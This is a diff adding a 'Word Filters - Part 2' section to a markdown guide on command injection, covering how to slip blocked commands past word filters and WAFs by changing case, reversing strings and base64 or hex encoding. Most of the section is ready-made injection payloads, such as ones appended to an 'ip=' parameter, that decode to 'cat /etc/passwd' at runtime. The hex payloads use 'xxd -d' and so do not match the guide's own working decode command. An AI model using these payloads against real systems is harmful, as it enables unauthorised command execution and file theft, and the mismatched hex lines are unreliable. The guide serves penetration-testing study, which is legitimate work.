@@ -12,6 +12,7 @@ This document summarizes core techniques for discovery and exploitation of **com
         - [Single Character Filters - Part 1](#single-character-filters---part-1)
         - [Single Character Filters - Part 2](#single-character-filters---part-2)
         - [Word Filters - Part 1](#word-filters---part-1)
+        - [Word Filters - Part 2](#word-filters---part-2)
 
 
 ---
@@ -330,3 +331,97 @@ Word-based blacklists are highly susceptible to evasion through shell parsing an
 ---
 
 ### Word Filters - Part 2
+
+When dealing with more advanced filtering mechanisms—such as Web Application Firewalls (WAFs) — simple word obfuscation techniques may no longer be sufficient. In these scenarios, additional transformation techniques can be used to alter command structure while preserving execution semantics. 
+
+One such technique is case manipulation, which exploits differences in how operating systems and shells handle character casing.
+
+Windows command interpreters such as `PowerShell` and `cmd.exe` are **case-insensitive**, making case-based obfuscation trivial. Commands can be arbitrarily cased without affecting execution:
+
+```bash
+WHOAMI
+WHOamI
+WhOaMi
+```
+
+Linux systems, however, are **case-sensitive**, meaning command names must be lowercase to execute successfully. In these environments, case manipulation can still be leveraged by transforming input at runtime.
+
+This can be achieved by using the `tr` utility within a `subshell` to convert uppercase characters to lowercase before execution:
+
+```bash
+$(tr "[A-Z]" "[a-z]" <<< "WhOaMi")
+$(tr "[A-Z]" "[a-z]" <<< "CaT")
+```
+
+A payload using this technique may resemble the following:
+
+```bash
+ip=127.0.0.1%0a$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
+```
+
+Another effective word-filter bypass technique involves **reversing** the command string and restoring it at runtime. This can be accomplished using the `rev` utility within a `subshell`.
+
+```bash
+# Reverse command --> imaohw
+echo 'whoami' | rev
+
+# Reverse back ---> whoami
+$(rev <<< 'imaohw')
+```
+
+An injected payload using this approach may look like:
+
+```bash
+ip=127.0.0.1%0a$(rev<<<'imaohw')
+```
+
+![Filtered output](images/word-filter5.png)
+
+A more robust obfuscation strategy involves **encoding** the command and **decoding** it at runtime prior to execution. Common encodings include `base64` and `hex`. 
+
+**Base64 Encoding:** 
+
+```bash
+# Base64 encode --> Y2F0IC9ldGMvcGFzc3dk
+echo -n 'cat /etc/passwd' | base64
+
+# Base64 decode --> cat /etc/passwd
+bash <<< $(base64 -d <<< Y2F0IC9ldGMvcGFzc3dk)
+
+# Base64 decode --> cat /etc/passwd
+sh <<< $(base64 -d <<< Y2F0IC9ldGMvcGFzc3dk)
+```
+
+**Base64 Payloads:**
+
+```bash
+ip=127.0.0.1%0abash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dk)
+
+ip=127.0.0.1%0ash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dk)
+```
+
+**Hex Encoding:**
+
+```bash
+# Hex encode --> 636174202f6574632f706173737764
+echo -n 'cat /etc/passwd' | xxd -p
+
+# Hex decode --> cat /etc/passwd
+bash<<<$(xxd -r -p <<< 636174202f6574632f706173737764)
+
+# Hex decode --> cat /etc/passwd
+sh<<<$(xxd -r -p <<< 636174202f6574632f706173737764)
+```
+
+**Hex Payloads:**
+
+```bash
+ip=127.0.0.1%0abash<<<$(xxd%09-d<<<636174202f6574632f706173737764)
+
+ip=127.0.0.1%0ash<<<$(xxd%09-d<<<636174202f6574632f706173737764)
+```
+
+Word-based filtering mechanisms often fail to account for shell evaluation order and runtime transformations. Techniques such as **case manipulation**, **string reversal**, and **encoding** allow attackers to reconstruct blocked commands dynamically, rendering exact-match filters ineffective when input is interpreted by a shell.
+
+---
+
